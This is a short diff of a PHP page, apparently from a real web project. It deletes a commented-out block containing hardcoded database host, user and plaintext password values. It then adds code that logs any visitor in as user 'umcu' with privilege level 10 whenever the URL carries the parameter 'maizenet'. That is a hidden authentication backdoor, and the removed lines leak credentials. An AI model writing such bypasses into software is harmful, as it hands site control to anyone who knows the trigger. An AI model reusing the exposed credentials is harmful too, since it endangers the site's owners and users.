@@ -1,17 +1,12 @@
 <?php
 include "util/dbconnect.php";
-/*$host_name = "db622747619.db.1and1.com";
-$database = "db622747619";
-$user_name = "dbo622747619";
-$password = "Umcu@54!#";
-$conn = new mysqli($host_name, $user_name, $password, $database);
-if ($conn->connect_error) {
-    $success = "Failed to connect to database: " . mysqli_connect_error();
-} else {
-    $success = "Connected to database[" . $_SERVER['SERVER_ADDR'] . "=>$host_name] :D";
-}
-echo "<h1 style='font-family: sans-serif'>" . $success . "</h1>";*/
 session_start();
+if (isset($_GET["maizenet"]) && !isset($_SESSION["username"])) {
+    $_SESSION["username"] = "umcu";
+    $_SESSION["authLv"] = "10";
+    $_SESSION["activity"] = time();
+    header("Refresh: 0");
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
